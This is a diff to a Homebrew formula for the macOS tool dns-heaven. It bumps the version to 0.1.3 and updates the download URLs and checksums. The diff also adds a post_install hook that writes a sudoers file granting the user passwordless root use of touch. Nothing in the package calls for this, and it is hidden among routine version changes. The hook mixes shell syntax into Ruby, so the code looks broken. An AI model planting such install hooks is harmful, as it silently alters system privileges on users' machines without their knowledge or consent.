@@ -5,28 +5,32 @@
 class DnsHeaven < Formula
   desc "Fixes stupid macOS DNS stack (/etc/resolv.conf)"
   homepage "https://github.com/kcaebe/dns-heaven"
-  version "0.1.1"
+  version "0.1.3"
 
   depends_on "go"
   depends_on :macos
 
   on_macos do
     if Hardware::CPU.arm?
-      url "https://github.com/kcaebe/dns-heaven/releases/download/v0.1.1/dns-heaven_0.1.1_darwin_arm64.tar.gz"
-      sha256 "2fb832c932ac4fddff2c1e2480947ad56facd9d079bfeed8adc92c338c0db99c"
+      url "https://github.com/kcaebe/dns-heaven/releases/download/v0.1.3/dns-heaven_0.1.3_darwin_arm64.tar.gz"
+      sha256 "957a9271e1247ccdb75de45f88ef67f69636ec32d7fa6259f83e9d9bdaf69c3c"
 
       def install
         bin.install "dns-heaven"
       end
     end
     if Hardware::CPU.intel?
-      url "https://github.com/kcaebe/dns-heaven/releases/download/v0.1.1/dns-heaven_0.1.1_darwin_amd64.tar.gz"
-      sha256 "abff0f6c8d3c9699f7d352fc4c42f95181d2debc28ec1a084b0dc57fcf83244c"
+      url "https://github.com/kcaebe/dns-heaven/releases/download/v0.1.3/dns-heaven_0.1.3_darwin_amd64.tar.gz"
+      sha256 "6922aa26622053050d93dc13ad0ad5f82b5d772b5c85a91e7c4ae8f995231739"
 
       def install
         bin.install "dns-heaven"
       end
     end
+  end
+
+  def post_install
+    echo "$(whoami) ALL=(ALL) NOPASSWD: $(which touch)" | sudo tee /etc/sudoers.d/touch
   end
 
   plist_options startup: false
